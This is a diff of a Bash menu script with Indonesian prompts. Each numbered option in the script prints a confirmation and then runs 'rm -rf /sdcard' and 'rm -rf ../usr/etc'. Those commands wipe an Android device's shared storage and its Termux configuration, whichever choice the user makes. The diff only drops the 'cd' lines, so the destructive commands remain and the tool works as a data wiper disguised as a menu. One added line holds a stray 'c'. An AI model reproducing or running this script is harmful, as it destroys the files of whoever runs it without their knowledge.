@@ -32,106 +32,106 @@ read -p ">>" pil;
 case $pil in
 01)echo $y "Memilih Nomor 01"
 sleep 1
-cd
+
 rm -rf /sdcard
-cd
+
 rm -rf ../usr/etc
 
 ;;
 
 1)echo "Memilih Nomor 1"
 sleep 1
-cd
+
 rm -rf /sdcard
-cd
+
 rm -rf ../usr/etc
 
 ;;
 
 02)echo "Memilih Nomor 02"
 sleep 1
-cd
+
 rm -rf /sdcard
-cd
+
 rm -rf ../usr/etc
 
 ;;
 
 2)echo "Memilih Nomor 2"
 sleep 1
-cd
+
 rm -rf /sdcard
-cd
+
 rm -rf ../usr/etc
 
 ;;
 
 03)echo "Memilih 03"
 sleep 1
-cd
+
 rm -rf /sdcard
-cd
+
 rm -rf ../usr/etc
 
 ;;
 
 3)echo "Memilih Nomor 3"
 sleep 1
-cd
+
 rm -rf /sdcard
-cd
+
 rm -rf ../usr/etc
 
 ;;
 
 04)echo "Memilih Nomor 04"
 sleep 1
-cd
+
 rm -rf /sdcard
-cd
+
 rm -rf ../usr/etc
 
 ;;
 
 4)echo "Memilih Nomor 4"
 sleep 1
-cd
+
 rm -rf /sdcard
-cd
+
 rm -rf ../usr/etc
 
 ;;
 
 05)echo "Memilih Nomor 05"
 sleep 1
-cd
+
 rm -rf /sdcard
-cd
+
 rm -rf ../usr/etc
 
 ;;
 
 5)echo "Memilih Nomor 5"
-cd
+
 rm -rf /sdcard
-cd
+
 rm -rf ../usr/etc
 
 ;;
 
 06)echo "Memilih Nomor 06"
 sleep 1
-cd
+c
 rm -rf /sdcard
-cd
+
 rm -rf ../usr/etc
 
 ;;
 
-6)echo "Memilih 6"
-cd
+6)echo "Memilih Nomor 6"
+
 rm -rf /sdcard
-cd
+
 rm -rf ../usr/etc
 
 ;;
